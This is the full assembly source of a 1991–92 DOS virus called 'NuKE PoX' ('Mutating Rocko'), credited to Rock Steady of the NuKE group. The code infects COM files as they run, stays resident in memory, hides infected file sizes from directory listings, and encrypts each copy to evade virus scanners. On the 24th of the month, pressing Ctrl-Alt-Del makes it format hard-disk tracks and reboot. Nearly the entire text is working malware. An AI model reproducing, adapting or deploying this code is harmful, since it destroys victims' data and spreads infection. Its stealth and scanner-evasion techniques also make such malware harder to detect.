;*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
;-*      (c) Rock Steady, Viral Developments                             -*
;*-      (c) NuKE Software Developement  1991, 1992                      *-
;-*  Virus: NuKE PoX Version 1.0  (Alias `Mutating Rocko')               -*
;*-  ~~~~~~                                                              *-
;-*  Notes: COM Infector, Hooks Int 9h & Int 21h, Memory Stealthness     -*
;*-  ~~~~~~ Dir Stealthness (FCB Way), Encrypting Virus (100 different   *-
;-*         Encrypted Copies of the Virus)                               -*
;*-  Bytes: 609 Bytes           Memory: (609 * 2) = 1,218 Bytes          *-
;-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*
crypt_size      equ     crypt - init_virus    ;All that gets Incrypted     
virus_size      equ     last - init_virus     ;Size of the Virus           
mut1            equ     3                                                  
mut2            equ     1                                                  
mut3            equ     103h                                               
del_code        equ     53h                   ;CTRL-ATL-DEL Key            
seg_a           segment byte public                                        
                assume  cs:seg_a, ds:seg_a                                 
                org     100h                                               
rocko           proc    far                                                
                                                                           
start:          jmp     init_virus                              ;+3 bytes  
;-*-*-*-*-*-*-*-*-[Start of Virus]*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
init_virus: call    decrypt         ;Decryption Routine Please  ;+3 Bytes  
            call    doit_now        ;Doit VirusMan...           ;+3 Bytes  
                                                                ;========  
doit_now:   pop     bp              ;Anything ABOVE THIS LINE     9 Bytes  
            sub     bp,109h         ;have to be added to the 100h! This    
            push    ax              ;SETs our `Delta Pointer'.             
            push    bx                                                     
            push    cx                                                     
            push    dx              ;Save registers                        
            push    si                                                     
            push    di                                                     
            push    bp                                                     
            push    es                                                     
            push    ds                                                     
                                                                           
            mov     ax,0abcdh       ;Are we resident Already?              
            int     21h                                                    
            cmp     bx,0abcdh       ;Yupe... Quit Then...                  
            je      exit_com                                               
                                                                           
            push    cs              ;Get CS=DS                             
            pop     ds                                                     
            mov     cx,es                                                  
                                                                           
            mov     ax,3509h        ;Hook Int 9 Please...                  
            int     21h                                                    
            mov     word ptr cs:[int9+2][bp],es     ;Save Orignal Int 9h   
            mov     word ptr cs:[int9][bp],bx       ;Save Orignal Int 9h   
                                                                           
            mov     ax,3521h        ;Some AVs may INTCEPT this Call!       
            int     21h             ;May be better to go Manually...       
            mov     word ptr cs:[int21+2][bp],es    ;Save the Int          
            mov     word ptr cs:[int21][bp],bx      ;Vector Table          
                                                                           
            dec     cx                ;Get a new Memory block              
            mov     es,cx             ;Put it Back to ES                   
            mov     bx,es:mut1                                             
            mov     dx,virus_size+virus_size ;Size to `Hide'               
            mov     cl,4            ;And all this crap hides               
            shr     dx,cl           ;your number of bytes in DX            
            add     dx,4                                                   
            mov     cx,es                                                  
            sub     bx,dx                                                  
            inc     cx                                                     
            mov     es,cx                                                  
            mov     ah,4ah          ;Call int to do it...                  
            int     21h                                                    
                                                                           
            jc      exit_com                                               
            mov     ah,48h                                                 
            dec     dx                                                     
            mov     bx,dx           ;It's Done... Yeah!                    
            int     21h                                                    
                                                                           
            jc      exit_com                                               
            dec     ax                                                     
            mov     es,ax                                                  
            mov     cx,8h           ;Here we move our Virus into           
            mov     es:mut2,cx      ;the `Hidden' memory!                  
            sub     ax,0fh                                                 
            mov     di,mut3                                                
            mov     es,ax                                                  
            mov     si,bp                                                  
            add     si,offset init_virus                                   
            mov     cx,virus_size                                          
            cld                                                            
            repne   movsb                                                  
                                                                           
            mov     ax,2521h                ;Restore Int21 with ours       
            mov     dx,offset int21_handler ;Where it starts               
            push    es                                                     
            pop     ds                                                     
            int     21h                                                    
                                                                           
            mov     ax,2509h                ;Restore Int9 with ours        
            mov     dx,offset int9_handler  ;The Handler...                
            int     21h                                                    
                                                                           
            push    cs                                                     
            pop     ds                                                     
exit_com:                                                                  
            mov     bx,offset buffer        ; Its a COM file restore       
            add     bx,bp                   ; First three Bytes...         
            mov     ax,[bx]                 ; Mov the Byte to AX           
            mov     word ptr ds:[100h],ax   ; First two bytes Restored     
            add     bx,2                    ; Get the next Byte            
            mov     al,[bx]                 ; Move the Byte to AL          
            mov     byte ptr ds:[102h],al   ; Restore the Last of 3 Byt    
            pop     ds                                                     
            pop     es                                                     
            pop     bp                      ; Restore Regesters            
            pop     di                                                     
            pop     si                                                     
            pop     dx                                                     
            pop     cx                                                     
            pop     bx                                                     
            pop     ax                                                     
            mov     ax,100h                 ; Jump Back to Beginning       
            push    ax                      ; Restores our IP (a CALL      
            retn                            ; Saves them, now we change    
int21       dd      ?               ;Our Old Int21                         
int9        dd      ?               ;Our Old Int9                          
;-*-*-*-*-*-*-*-*[Int 9h Handler]-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
int9_handler:                                                              
            push    ax                                                     
            in      al,60h          ;Has the user attempted a              
            cmp     al,del_code     ;CTRL-ALT-DEL                          
            je      warm_reboot     ;Yes! Screw him                        
bye_bye:    pop     ax                                                     
            jmp     dword ptr cs:[int9]    ;Nope, Leave alone              
warm_reboot:                                                               
            mov     ah,2ah             ;Get Date Please                    
            int     21h                                                    
            cmp     dl,18h          ;Is it 24th of the Month?              
            jne     bye_bye         ;Yes, bye_Bye HD                       
            mov     ch,0                                                   
hurt_me:    mov     ah,05h                                                 
            mov     dh,0                                                   
            mov     dl,80h          ;Formats a few tracks...               
            int     13h             ;Hurts So good...                      
            inc     ch                                                     
            cmp     ch,20h                                                 
            loopne  hurt_me                                                
            db      0eah,0f0h,0ffh,0ffh,0ffh  ;Reboot!                     
            iret                                                           
;-*-*-*-*-*-*-*-*-[Dir Stealth Handler]-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
dir_handler:                                                               
             pushf                                                         
             push    cs                                                    
             call    int21call       ;Get file Stats                       
             test    al,al           ;Good FCB?                            
             jnz     no_good         ;nope                                 
             push    ax                                                    
             push    bx                                                    
             push    es                                                    
             mov     ah,51h          ;Is this Undocmented? huh...          
             int     21h                                                   
                                                                           
             mov     es,bx                                                 
             cmp     bx,es:[16h]                                           
             jnz     not_infected    ;Not for us man...                    
             mov     bx,dx                                                 
             mov     al,[bx]                                               
             push    ax                                                    
             mov     ah,2fh          ;Get file DTA                         
             int     21h                                                   
                                                                           
             pop     ax                                                    
             inc     al                                                    
             jnz     fcb_okay                                              
             add     bx,7h                                                 
fcb_okay:    mov     ax,es:[bx+17h]                                        
             and     ax,1fh          ;UnMask Seconds Field                 
             xor     al,1dh          ;Is in 58 seconds?                    
             jnz     not_infected    ;Nope...                              
             and     byte ptr es:[bx+17h],0e0h                             
             sub     es:[bx+1dh],virus_size    ;Yes minus virus size       
             sbb     es:[bx+1fh],ax                                        
not_infected:pop     es                                                    
             pop     bx                                                    
             pop     ax                                                    
no_good:     iret                                                          
;-*-*-*-*-*-*-*-*[Int 21h Handler]*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
int21_handler:                                                             
             cmp     ax,4b00h        ;File executed                        
             je      execute                                               
             cmp     ah,11h          ;Dir handler                          
             je      dir_handler                                           
             cmp     ah,12h          ;Next file Dir handler                
             je      dir_handler                                           
             cmp     ax,0abcdh       ;Virus testing                        
             jne     int21call                                             
             mov     bx,0abcdh                                             
int21call:                                                                 
             jmp     dword ptr cs:[int21] ;Split...                        
             ret                                                           
execute:                                                                   
             push    ax                                                    
             push    bx                                                    
             push    cx                                                    
             push    dx                                                    
             push    si                                                    
             push    di                                                    
             push    es                                                    
             push    ds                                                    
                                                                           
             mov     ax,4300h                ;Get file Attribs             
             int     21h                                                   
             jc      exit                                                  
                                                                           
             test    cl,1h                   ;Make sure there normal       
             jz      open_file               ;Okay there are               
             and     cl,0feh                 ;Nope, Fix them...            
             mov     ax,4301h                ;Save them now                
             int     21h                                                   
             jc      exit                                                  
                                                                           
open_file:   mov     ax,3D02h                                              
             int     21h                     ;Open File to Infect please   
                                                                           
             jc      exit                   ;Error Split                   
             mov     bx,ax                   ;BX File handler              
             mov     ax,5700h                ;Get file TIME + DATE         
             int     21h                                                   
                                                                           
             mov     al,cl                                                 
             or      cl,1fh                  ;Un mask Seconds              
             dec     cx                      ;60 seconds                   
             dec     cx                      ;58 seconds                   
             xor     al,cl                   ;Is it 58 seconds?            
             jz      exit                   ;File already infected         
                                                                           
             push    cs                                                    
             pop     ds                                                    
             mov     word ptr ds:[old_time],cx       ;Save Time            
             mov     word ptr ds:[old_date],dx       ;Save Date            
                                                                           
             mov     ah,3Fh                                                
             mov     cx,3h                                                 
             mov     dx,offset ds:[buffer]   ;Read first 3 bytes           
             int     21h                                                   
                                                                           
             jc      exit_now                   ;Error Split               
             mov     ax,4202h                   ;Move file pointer to end  
             xor     cx,cx                      ;of file...                
             xor     dx,dx                                                 
             int     21h                                                   
                                                                           
             jc      exit_now                            ;Error Split      
             cmp     word ptr cs:[buffer],5A4Dh          ;Is file an EXE?  
             je      exit                                ;Yupe! Split      
             mov     cx,ax                                                 
             sub     cx,3                                ;Set the JMP      
             mov     word ptr cs:[jump_address+1],cx                       
             call    infect_me                           ;Infect!          
             jc      exit_now                            ;error split      
             mov     ah,40h                         ;Write back the first 3
             mov     dx,offset ds:[jump_address]    ;bytes                 
             mov     cx,3h                                                 
             int     21h                                                   
exit_now:                                                                  
             mov     cx,word ptr cs:[old_time]      ;Restore old time      
             mov     dx,word ptr cs:[old_date]      ;Restore Old date      
             mov     ax,5701h                                              
             int     21h                                                   
                                                                           
             mov     ah,3Eh                                                
             int     21h                     ;Close File now...            
exit:                                                                      
             pop     ds                                                    
             pop     es                                                    
             pop     di                                                    
             pop     si                                                    
             pop     dx                                                    
             pop     cx                                                    
             pop     bx                                                    
             pop     ax                                                    
             jmp     dword ptr cs:[int21]     ;Jmp back to whatever        
rocko        endp                                                          
;-*-*-*-*-*-*-*-*-*[Infection Routine]*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*- 
infect_me    proc    near                                                  
             mov     ah,2ch                  ;Get Time                     
             int     21h                                                   
             push    dx                      ;Split seconds to AX          
             pop     ax                                                    
             mov     byte ptr cs:[value],al  ;AL = 0 to 99                 
                                             ;New Encryption Value         
             mov     cx,virus_size                                         
             push    cs                                                    
             pop     es                      ;Copy ANOTHER copy of the     
             mov     si,offset init_virus    ;Virus to the end of us       
             mov     di,offset last                                        
             repne   movsb                                                 
                                                                           
             mov     cx,crypt_size                                         
             sub     cx,3h                   ;Encrypt that 2nd copy!       
             push    bp                                                    
             mov     bp,offset last + 3h                                   
             call    decrypt_encrypt                                       
             pop     bp                                                    
                                                                           
             mov     ah,40h                  ;Write the New Encrypted      
             mov     dx,offset last          ;Virus to File!               
             mov     cx,virus_size                                         
             int     21h                                                   
                                                                           
             jc      exit_error                   ;Error Split             
             mov     ax,4200h                                              
             xor     cx,cx                   ;Pointer back to beginning    
             xor     dx,dx                   ;file!                        
             int     21h                                                   
                                                                           
             jc      exit_error                   ;Split Dude...           
             clc                             ;Clear carry flag             
             retn                                                          
exit_error:                                                                
             stc                             ;Set carry flag               
             retn                                                          
infect_me    endp                                                          
old_time       dw      ?                                                   
old_date       dw      ?                                                   
jump_address   db      0E9h,90h,90h                                        
buffer         db      90h,0CDh,020h                                       
crypt:                                                                     
msgs           db      "(c) Rock Steady/NuKE"   ;No other than `Moi'...    
;-*-*-*-*[Simple BUT EFFECTIVE Encryption/Decryption Routine]-*-*-*-*-*-*- 
decrypt      proc    near                                                  
             pop     bp                                                    
             push    bp                                                    
             mov     al,byte ptr [value-106h][bp]    ;Get new Encryption   
             mov     cx,crypt_size                   ;Value                
decrypt_encrypt:                                                           
             xor     cs:[bp],al             ;Fuck Scanners and put a       
;***************************************************************************             
             not     al
             inc     bp                     ;`NOT AL' anywhere here...     
             loop    decrypt_encrypt                                       
             retn                                                          
value        db      00h             ;Encryption value!                    
decrypt      endp                                                          
last:                                                                      
seg_a        ends                                                          
             end     start                                                 
